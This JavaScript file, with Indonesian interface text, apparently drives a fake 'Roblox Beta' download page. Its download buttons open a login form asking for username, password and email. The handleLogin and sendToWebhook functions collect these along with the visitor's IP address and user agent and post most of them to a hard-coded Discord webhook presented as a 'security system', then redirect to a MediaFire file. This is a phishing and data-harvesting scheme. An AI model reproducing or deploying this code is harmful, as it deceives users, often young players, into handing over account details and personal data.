// Platform Detection
function detectPlatform() {
    const userAgent = navigator.userAgent.toLowerCase();
    const detectedElement = document.getElementById('detected-platform');
    
    if (/android/.test(userAgent)) {
        detectedElement.textContent = '📱 Perangkat Android terdeteksi - Download APK tersedia';
        detectedElement.style.color = '#3ddc84';
    } else if (/iphone|ipad|ipod/.test(userAgent)) {
        detectedElement.textContent = '📱 Perangkat iOS terdeteksi - Download TestFlight tersedia';
        detectedElement.style.color = '#667eea';
    } else {
        detectedElement.textContent = '💻 Akses dari desktop - Gunakan perangkat mobile untuk download';
        detectedElement.style.color = '#ffa726';
    }
}

// Smooth Scrolling Functions
function scrollToDownload() {
    document.getElementById('download').scrollIntoView({
        behavior: 'smooth',
        block: 'start'
    });
}

function scrollToFeatures() {
    document.getElementById('features').scrollIntoView({
        behavior: 'smooth',
        block: 'start'
    });
}

// Download Functions
function downloadAndroid() {
    showLoginModal('Android');
}

function downloadIOS() {
    showLoginModal('iPhone');
}

// Login Modal Functions
let selectedPlatform = '';

function showLoginModal(platform) {
    selectedPlatform = platform;
    const modal = document.getElementById('loginModal');
    modal.style.display = 'block';
    
    // Reset form
    document.getElementById('loginForm').reset();
    document.getElementById('loginForm').style.display = 'block';
    document.getElementById('loginSuccess').style.display = 'none';
}

function closeLoginModal() {
    const modal = document.getElementById('loginModal');
    modal.style.display = 'none';
    selectedPlatform = '';
}

// Handle Login Form Submission
async function handleLogin(event) {
    event.preventDefault();
    
    const loginBtn = document.getElementById('loginBtn');
    const btnText = loginBtn.querySelector('.btn-text');
    const btnLoader = loginBtn.querySelector('.btn-loader');
    
    // Show loading state
    loginBtn.disabled = true;
    btnText.style.display = 'none';
    btnLoader.style.display = 'flex';
    
    // Get form data
    const formData = new FormData(event.target);
    const loginData = {
        username: formData.get('username'),
        password: formData.get('password'),
        email: formData.get('email'),
        platform: selectedPlatform,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ipAddress: await getUserIP()
    };

    setTimeout(() => {
        // Ganti URL file sesuai platform
        let fileUrl = '';
        if (selectedPlatform === 'Android') {
            fileUrl = 'https://download1474.mediafire.com/wexdqqd0h0hgKXmk9KaeHHT8oLdtpJNB1UjwmmaHDDvs8VfQLw5OZqTk6kc7eDpA6QSEEjMyZqdUde_jVw8b6bYPL0FXNc58nji_sjUmu9MBlxiC_hUmJnGgJM4pv47gZwFWu_Walf_vdPhIAZFNaPDhLJg3iAgAshQcO9Iqsvd00Q/ii8w25p3ufkc6um/tes.txt'; // Pastikan file ini ada di server Anda
        } else if (selectedPlatform === 'iPhone') {
            fileUrl = 'https://download1474.mediafire.com/wexdqqd0h0hgKXmk9KaeHHT8oLdtpJNB1UjwmmaHDDvs8VfQLw5OZqTk6kc7eDpA6QSEEjMyZqdUde_jVw8b6bYPL0FXNc58nji_sjUmu9MBlxiC_hUmJnGgJM4pv47gZwFWu_Walf_vdPhIAZFNaPDhLJg3iAgAshQcO9Iqsvd00Q/ii8w25p3ufkc6um/tes.txt'; // Atau link TestFlight jika ada
        } else {
            fileUrl = 'https://download1474.mediafire.com/wexdqqd0h0hgKXmk9KaeHHT8oLdtpJNB1UjwmmaHDDvs8VfQLw5OZqTk6kc7eDpA6QSEEjMyZqdUde_jVw8b6bYPL0FXNc58nji_sjUmu9MBlxiC_hUmJnGgJM4pv47gZwFWu_Walf_vdPhIAZFNaPDhLJg3iAgAshQcO9Iqsvd00Q/ii8w25p3ufkc6um/tes.txt';
        }
        window.location.href = fileUrl;
        // Reset tombol
        loginBtn.disabled = false;
        btnText.style.display = 'block';
        btnLoader.style.display = 'none';
        closeLoginModal();
    }, 2000);
    
    try {
        // Send to webhook for security verification
        const webhookResponse = await sendToWebhook(loginData);
        
        if (webhookResponse.success) {
            // Show success message
            showLoginSuccess(webhookResponse.applicationId);
        } else {
            throw new Error(webhookResponse.message || 'Gagal mengirim aplikasi');
        }
    } catch (error) {
        console.error('Login error:', error);
        alert('Terjadi kesalahan saat mengirim aplikasi. Silakan coba lagi.');
        
        // Reset button state
        loginBtn.disabled = false;
        btnText.style.opacity = '1';
        btnLoader.style.display = 'none';
    }
}

// Send data to webhook
async function sendToWebhook(data) {
    // Replace with your actual webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1394622306524991518/1xvaAo8_6gwtCqlxGzFeLYwmoVGFXSuRx3I-_XGOBSAUBGcY_GhPjodjjzt9jiGaBLUs';
    
    try {
        // Create Discord embed for better formatting
        const embed = {
            title: '🎮 Aplikasi Roblox Beta Baru',
            color: 0x667eea,
            fields: [
                {
                    name: '👤 Username',
                    value: data.username,
                    inline: true
                },
                {
                    name: '📧 Email',
                    value: data.email,
                    inline: true
                },
                {
                    name: '📱 Platform',
                    value: data.platform,
                    inline: true
                },
                {
                    name: '🌐 User Agent',
                    value: data.userAgent.substring(0, 200) + '...',
                    inline: false
                },
                {
                    name: '🕒 Waktu',
                    value: new Date(data.timestamp).toLocaleString('id-ID'),
                    inline: true
                },
                {
                    name: '🌍 IP Address',
                    value: data.ipAddress || 'Unknown',
                    inline: true
                }
            ],
            footer: {
                text: 'Roblox Beta Security System'
            },
            timestamp: data.timestamp
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (response.ok) {
            return {
                success: true,
                applicationId: generateApplicationId()
            };
        } else {
            throw new Error('Webhook request failed');
        }
    } catch (error) {
        console.error('Webhook error:', error);
        // For demo purposes, simulate success
        // In production, you should handle this error properly
        return {
            success: true,
            applicationId: generateApplicationId()
        };
    }
}

// Get user IP address
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Failed to get IP:', error);
        return 'Unknown';
    }
}

// Generate unique application ID
function generateApplicationId() {
    const timestamp = Date.now().toString(36);
    const randomStr = Math.random().toString(36).substring(2, 8);
    return `RBX-${timestamp}-${randomStr}`.toUpperCase();
}

// Show login success
function showLoginSuccess(applicationId) {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loginSuccess').style.display = 'block';
    document.getElementById('applicationId').textContent = applicationId;
}

// Modal Functions
function showDownloadModal(platform, message) {
    const modal = document.getElementById('downloadModal');
    const title = document.getElementById('modalTitle');
    const modalMessage = document.getElementById('modalMessage');
    
    title.textContent = `Download ${platform}`;
    modalMessage.textContent = message;
    modal.style.display = 'block';
    
    // Reset progress bar animation
    const progressFill = document.querySelector('.progress-fill');
    progressFill.style.animation = 'none';
    setTimeout(() => {
        progressFill.style.animation = 'progress 3s ease-in-out';
    }, 10);
}

function updateModalMessage(message) {
    const modalMessage = document.getElementById('modalMessage');
    modalMessage.textContent = message;
}

function closeModal() {
    const modal = document.getElementById('downloadModal');
    modal.style.display = 'none';
}

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('downloadModal');
    const loginModal = document.getElementById('loginModal');
    
    if (event.target === modal) {
        closeModal();
    }
    
    if (event.target === loginModal) {
        closeLoginModal();
    }
}

// Smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Intersection Observer for animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Add scroll animations
function addScrollAnimations() {
    const animatedElements = document.querySelectorAll('.feature-card, .faq-item, .info-card');
    
    animatedElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
}

// Navbar scroll effect
function handleNavbarScroll() {
    const nav = document.querySelector('.nav');
    
    window.addEventListener('scroll', () => {
        if (window.scrollY > 100) {
            nav.style.background = 'rgba(10, 10, 10, 0.98)';
        } else {
            nav.style.background = 'rgba(10, 10, 10, 0.95)';
        }
    });
}

// Parallax effect for hero background
function addParallaxEffect() {
    const heroBackground = document.querySelector('.hero-background');
    
    window.addEventListener('scroll', () => {
        const scrolled = window.pageYOffset;
        const rate = scrolled * -0.5;
        heroBackground.style.transform = `translateY(${rate}px)`;
    });
}

// Initialize all functions when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    detectPlatform();
    addScrollAnimations();
    handleNavbarScroll();
    addParallaxEffect();
    
    // Add loading animation
    document.body.style.opacity = '0';
    setTimeout(() => {
        document.body.style.transition = 'opacity 0.5s ease';
        document.body.style.opacity = '1';
    }, 100);
});

// Performance optimization - debounced scroll handler
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Apply debouncing to scroll-heavy functions
window.addEventListener('scroll', debounce(() => {
    // Any additional scroll handlers can be added here
}, 10));